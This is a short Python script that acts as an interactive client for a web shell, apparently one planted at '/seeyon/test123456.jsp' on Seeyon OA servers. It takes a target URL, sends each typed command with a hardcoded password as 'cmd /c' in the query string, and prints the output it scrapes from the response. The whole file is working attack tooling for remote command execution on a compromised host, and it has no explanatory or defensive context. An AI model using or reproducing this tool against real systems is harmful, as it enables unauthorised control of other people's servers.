import re
import sys
import readline

import requests

from urllib.parse import unquote,quote

url = [*sys.argv,][1:]
if not url:
    url = input('[+] Please input url：')
else:
    url = url[0]

while 1:
    try:
        command = input(">>> ")
    except:
        print("\nBye~ I Love You~~~")
        sys.exit(1)

    if not command:
        print("[Info] Empty command")
        continue

    exp_url = url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+" + quote(command)

    try:
        req = requests.get(exp_url)
    except:
        print("[Error]", exp_url)
        continue

    if req.status_code == 200:
        result = re.findall("<pre>(.*?)</pre>", req.text, re.S)[0]
        print(result)
    else:
        print("[Error]", exp_url, req)
